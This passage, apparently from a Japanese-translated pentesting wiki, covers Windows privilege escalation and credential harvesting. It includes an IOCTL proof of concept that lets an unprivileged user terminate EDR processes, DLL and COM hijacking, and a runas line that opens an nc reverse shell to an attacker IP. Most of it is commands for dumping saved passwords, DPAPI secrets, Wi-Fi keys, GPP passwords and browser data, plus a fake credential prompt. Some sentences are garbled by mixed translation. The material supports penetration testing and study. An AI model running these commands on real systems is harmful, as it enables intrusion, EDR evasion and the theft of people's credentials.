accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ プラグインの自動ロードによる永続化／実行

Notepad++ は `plugins` サブフォルダ配下の任意の plugin DLL を自動ロードします。書き込み可能な portable/copy インストールが存在する場合、悪意のある plugin を配置すると、起動時に毎回 `notepad++.exe` 内で自動的にコードが実行されます（`DllMain` や plugin callbacks からの実行を含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### スタートアップでの実行

**別のユーザーによって実行される registry または binary を上書きできるか確認してください。**\
**読んでください**。**以下のページ** を参照し、興味深い **autoruns locations to escalate privileges** について詳しく学んでください：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

可能性のある **サードパーティの不審/脆弱な** ドライバを探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが任意のカーネル読み書きプリミティブを公開している場合（不適切に設計された IOCTL ハンドラで一般的）、カーネルメモリから直接 SYSTEM トークンを盗んで権限昇格できます。手順は以下を参照：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者制御下の Object Manager パスを開くようなレースコンディションのバグでは、ルックアップを意図的に遅くする（最大長コンポーネントや深いディレクトリチェーンを使う）ことで、ウィンドウをマイクロ秒から数十マイクロ秒に拡張できます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

最近の hive 脆弱性は、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子孫を悪用し、メタデータ破損をカスタムドライバなしに kernel paged-pool オーバーフローに変換することを可能にします。完全なチェーンは以下を参照：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

一部の署名済みサードパーティドライバは、IoCreateDeviceSecure で強力な SDDL を指定して device object を作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグが無いと、追加コンポーネントを含むパスを経由してデバイスを開いた際に secure DACL が適用されず、権限のない任意のユーザが次のような namespace path を使ってハンドルを取得できます:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

ユーザがデバイスを開けるようになると、ドライバが公開する権限付き IOCTL を LPE や改ざんに悪用できます。現実で観測された例:
- 任意プロセスへのフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM シェル）。
- 制限のない raw disk 読み書き（オフライン改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意プロセスの終了、これによりユーザ空間からカーネル経由で AV/EDR を停止させることが可能になる。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLで制限することを意図したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定すること。
- 権限の高い操作については呼び出し元コンテキストを検証する。プロセスの終了やハンドル返却を許可する前に PP/PPL チェックを追加すること。
- IOCTLs を制限する（アクセスマスク、METHOD_*、入力検証）とともに、直接カーネル権限を与える代わりにブローカー型モデル（brokered models）を検討すること。

ディフェンダー向けの検出アイデア
- 疑わしいデバイス名（例: \\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示唆する特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバ用ブロックリストを適用する（HVCI/WDAC/Smart App Control）とともに、独自の allow/deny リストを維持する。

## PATH DLL Hijacking

もし **write permissions inside a folder present on PATH** があると、プロセスにロードされる DLL をハイジャックして **escalate privileges** できる可能性がある。

PATH 内のすべてのフォルダの権限を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックの悪用方法の詳細については、次を参照してください：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされている他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**アクセス制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルール一覧、ルール作成、無効化など)**

さらに[ネットワーク列挙のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### WindowsのLinuxサブシステム (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すれば任意のポートで待ち受けできます（最初に `nc.exe` を使ってポートで待ち受けすると、GUI 経由で `nc` を firewall に許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単に bash を root として起動するには、`--default-user root` を試してください

`WSL` ファイルシステムはフォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で参照できます

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **ユーザーを自動的にログインさせる**.

At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.
Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプションとともに使用できます。以下の例は SMB share を介してリモートのバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された credential を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** はデータの対称暗号化の方法を提供します。これは主に Windows オペレーティングシステム内で、非対称鍵の秘密鍵を対称的に暗号化するために使用されます。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化が関係するシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用して暗号化されたユーザーの RSA キーは、%APPDATA%\Microsoft\Protect\{SID} ディレクトリに格納されます。ここで {SID} はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。 **DPAPI key は、ユーザーの秘密鍵を保護するマスターキーと同じファイルに共置されており、通常 64 バイトのランダムデータで構成されます。**（このディレクトリへのアクセスは制限されており、`dir` コマンドを使って CMD でその内容を一覧表示することはできませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使ってこれを復号できます。

**credentials files protected by the master password** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
`sekurlsa::dpapi` module を使用すると、**memory** から多くの **DPAPI** **masterkeys** を抽出できます（root の場合）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された資格情報を簡便に保存する手段として、しばしば **scripting** や自動化タスクで使用されます。これらの資格情報は **DPAPI** によって保護されており、通常、作成されたのと同じコンピュータ上の同じユーザでなければ復号できません。

ファイルに含まれる **PS credentials** を **decrypt** するには、次のように実行します:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### ワイファイ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

次の場所で見つけることができます: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップの資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Mimikatz の `sekurlsa::dpapi` モジュールを使って、メモリから **多くの DPAPI masterkeys を抽出**できます

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **パスワードを保存** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
もしこのファイルが存在する場合、いくつかの **credentials** が設定されており、**回復** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
インストーラーは**run with SYSTEM privileges**で実行され、多くは**DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH キー

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるので、そこに何か興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
もしそのパス内にエントリを見つけたら、おそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが動作しておらず、起動時に自動的に開始させたい場合は、以下を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかの ssh キーを作成し、`ssh-add` で追加して ssh でマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証時に `dpapi.dll` の使用を特定できませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

SiteList.xmlというファイルを検索してください

### Cached GPP Pasword

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は任意のドメインユーザがアクセス可能でした。第二に、これらの GPP 内のパスワードは公開されているデフォルトキーを用いて AES256 で暗号化されており、任意の認証済みユーザが復号できました。これにより、ユーザが権限昇格を獲得できるという重大なリスクがありました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、"cpassword" フィールドが空でないファイルを検出する関数が作成されました。該当ファイルを見つけると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。返されるオブジェクトには GPP の詳細とファイルの場所が含まれ、脆弱性の特定と修復に役立ちます。

次のファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 内で検索してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentialsを要求する

もし相手が知っている可能性があると思うなら、常に**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsの入力を求める**ことができます（ただし、クライアントに直接**尋ねる**ことで**credentials**を入手するのは非常に**危険**である点に注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、**passwords** を **clear-text** または **Base64** で含んでいた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索してください:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内の資格情報

Binも確認して、その中に資格情報がないか探してください。

いくつかのプログラムで保存された**パスワードを復元する**には、次のツールを使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからOpenSSHキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

パスワードが保存されている**Chrome or Firefox**のdbを確認してください。\
またブラウザの履歴、ブックマーク、そしてお気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windowsオペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の相互通信を可能にします。各COMコンポーネントは **class ID (CLSID)** で識別され、各コンポーネントは1つまたは複数のインターフェースを通じて機能を公開し、それらは **interface IDs (IIDs)** で識別されます。

COMクラスとインターフェースはそれぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下で定義されます。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成されたもの、すなわち **HKEY\CLASSES\ROOT** です。

このレジストリのCLSIDsの中には子レジストリ **InProcServer32** があり、そこにはDLLを指す**既定値**と、**ThreadingModel** という値が含まれています。ThreadingModel は **Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、または **Neutral**（スレッドニュートラル）になり得ます。

![](<../../images/image (729).png>)

基本的に、実行されるDLLのいずれかを上書きできるなら、そのDLLが別のユーザーによって実行される場合に**権限昇格**が可能になることがあります。

攻撃者がCOM Hijackingを永続化（persistence）メカニズムとしてどのように使用するかを学ぶには、次を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリ内でキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインです。被害者内でcredentialsを検索するすべての **automatically execute every metasploit POST module that searches for credentials** を実行するために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているpasswordsを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからpasswordを抽出する優れたツールです。

